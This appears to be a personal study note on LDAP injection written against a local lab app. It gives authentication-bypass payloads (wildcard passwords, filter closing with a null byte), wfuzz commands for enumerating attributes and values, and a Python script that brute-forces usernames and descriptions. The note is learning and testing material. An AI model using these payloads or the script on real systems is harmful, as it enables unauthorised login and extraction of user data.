
# Theory

## What is LDAP?

> **L**ightweight **D**irectory **A**ccess **P**rotocol

LDAP is a set of protocols of open source that are used to access to the information that is centralized.

Is a protocol based in the connection of client and server

----
# Recon

LDAP normally is used in port **389**, but LDAPS uses port **636** and established TLS/SSL.

You can use the scripts of nmap to obtain the name of the domain controller

````bash
nmap --script ldap\* -p389 localhost
````

You can use [[ldapsearch]]

````bash
ldapsearch -x -H ldap://localhost -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin 'cn=admin'
````

`-x` --> Simple Authentication 

`dc=` --> Normally the domain controller is indicate in different switches, this is example.org

`-D "cn=admin,dc=example,dc=org"` --> Distinguished name. With what user do you want to authenticate

`-w admin` --> The password of indicate user

`'cn=admin'` --> This is a filter that we put to do a query. If the user exists report all the information

You can put **AND** to concatenate searches 

````bash
ldapsearch -x -H ldap://localhost -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin '(&(cn=admin)(description=LDAP*))'
````

To put and **OR** you only have to change the ampersand with the |

----

# Ways to authenticate

Imagine that you have an login panel that used LDAP and this is not sanitized 

## Wildcards

A way to authenticate is used wildcard:

````bash
(&
	(cn=admin)
	(userPassword=*)
)
````

admin | \*

![](../../../Images/Pasted%20image%2020230808142052.png)

## Avoid authentication closing the query and using null byte to comment the rest

You can avoid the authenticate using this:

````bash
(&(cn=admin))%00)(userPassword=*)
````

if you can close the brackets you are indicating that the rest of the query isn't performed

You can use a **null byte** to comment the rest of the query

````bash
user_id=admin))%00&password=sdfasdf&login=1&submit=Submit
````

You can copy the cookie and put in your request:

> Cookie: PHPSESSID=...


---

## Enum user using wildcard

To enumerate user you can use this:

````bash
user_id=ad*&password=*&login=1&submit=Submit
````

---

# Ldapadd

You can use [[ldapadd]] to add a file and create a new user

````bash
ldapadd -x -H ldap://localhost -D "cn=admin,dc=example,dc=org" -w admin -f newuser.ldif
````

---

Or you can put two possibilities of search

````bash
(|
    (&
        (cn=admin)
        (age=15)
    )

    (&
        (cn=admin)
        (rol=pentester)
    )
)
````

Here you say, the user is admin and age is 15 years or the user is admin and the rol is pentester

---

# Enumerate attributes

````bash
(&
    (cn=admin)
    (FUZZ=*))%00
    (userPassword=*)
)
````

With wfuzz we can enumerate the names of attributes (you can use this wordlist: /usr/share/seclists/Fuzzing/LDAP-active-directory-attributes.txt )

You are going to search attribute available for the user admin, like phoneNumber,mail...

````bash
wfuzz -c --hh=550 -w /usr/share/seclists/Fuzzing/LDAP-active-directory-attributes.txt -d 'user_id=admin)(FUZZ=*))%00&password=*&login=1&submit=Submit' http://localhost:8888
````

`--hh=550` --> Hide all the response that have 550 characters


or if you want to search the attribute for all the user:

````bash
wfuzz -c --hh=550 -w /usr/share/seclists/Fuzzing/LDAP-active-directory-attributes.txt -d 'user_id=*)(FUZZ=*))%00&password=*&login=1&submit=Submit' http://localhost:8888
````

## See the attribute

### enum phoneNumber

````bash
wfuzz -c --hh=550 -z range,0-9 -d 'user_id=sergiky)(telephoneNumber=FUZZ*))%00&password=*&login=1&submit=Submit' http://localhost:8888
````

and the same with the rest of attributes:

````bash
user_id=txhaka)(mail=t*))%00&password=*&login=1&submit=Submit
````

---

# Script


````python
#!/usr/bin/python3

import requests
import time
import sys
import signal
import string
import pdb

from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Saliendo... [!]\n")
    sys.exit(1)

#ctrl_c
signal.signal(signal.SIGINT, def_handler)

# Global variables

main_url = "http://localhost:8888"
burp = {'http':'http://127.0.0.1:8080'}

def getInitialUsers():
    characters = string.ascii_lowercase

    initial_users = []

    headers = {'Content-Type':'application/x-www-form-urlencoded'}

    for character in characters:
        
        post_data = "user_id={}*&password=*&login=1&submit=Submit" .format(character)

        r = requests.post(main_url, data=post_data, headers=headers, allow_redirects=False, proxies=burp)

        if r.status_code == 301:
            initial_users.append(character)
    
    return initial_users

def getUsers(initial_users):
    
    characters = string.ascii_lowercase

    headers = {'Content-Type':'application/x-www-form-urlencoded'}
    valid_users = []

    for first_character in initial_users:
        
        user = ""

        for position in range(0, 15):
            for character in characters:

                post_data = "user_id={}{}{}*&password=*&login=1&submit=Submit" .format(first_character,user,character)
            
                r = requests.post(main_url, data=post_data, headers=headers, allow_redirects=False)

                if r.status_code == 301:
                    user += character
                    break # TODO --> BREAK HERE

        valid_users.append(first_character + user)    

    print("\n")

    for user in valid_users:
        log.info("Usuario válido encontrado %s" % user)

    print("\n")

    return valid_users

def getDescription(user):

    characters = string.ascii_lowercase + ' '

    headers = {'Content-Type':'application/x-www-form-urlencoded'}

    description = ""

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")
    time.sleep(2)

    p2 = log.progress("Descripción")

    for posistion in range(0,50):
        for character in characters:
            post_data = "user_id={})(description={}{}*))%00&password=*&login=1&submit=Submit" .format(user, description, character)

            r = requests.post(main_url, data=post_data, headers=headers, allow_redirects=False)

            if r.status_code == 301:
                description += character
                p2.status(description)
                break # TODO BREAK HERE

    p1.success("Proceso de fuerza bruta concluido")
    p2.success("La descripción del usuario %s es: %s" % (user, description))

    print("\n")

if __name__ == '__main__':
    
    initial_users = getInitialUsers()
    valid_users = getUsers(initial_users)

    for i in range(0, 4):
        getDescription(valid_users[i])


````

---

# Labs

- [https://github.com/motikan2010/LDAP-Injection-Vuln-App](https://github.com/motikan2010/LDAP-Injection-Vuln-App), change the Dockerfile (php 8.0)

---

# Tags

#vulnerabilty #ldapinjection